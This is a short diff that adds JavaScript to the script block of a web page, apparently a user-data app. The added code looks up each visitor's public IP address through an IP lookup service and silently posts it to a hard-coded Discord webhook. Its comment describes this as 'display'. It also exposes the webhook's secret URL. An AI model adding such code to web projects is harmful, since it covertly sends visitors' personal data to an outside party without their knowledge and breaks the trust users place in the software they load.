@@ -1303,6 +1303,26 @@
                 saveUserData(currentUser.id);
             }
         });
+
+        // Fetch and display the user's IP address
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                console.log('User IP Address:', data.ip);
+                // Send IP address to Discord webhook
+                fetch('https://discord.com/api/webhooks/1370829964617846964/YiDUFMBPnduA2GcwagOCWiVLz3lI6iSOOB34LLN_JVvrOu8KVVZO3hxvwZkJfSVVf228', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            content: `User IP Address: ${data.ip}`
+                        })
+                    })
+                    .then(response => console.log('IP sent to Discord webhook'))
+                    .catch(error => console.error('Error sending IP to Discord webhook:', error));
+            })
+            .catch(error => console.error('Error fetching IP address:', error));
     </script>
 </body>
 
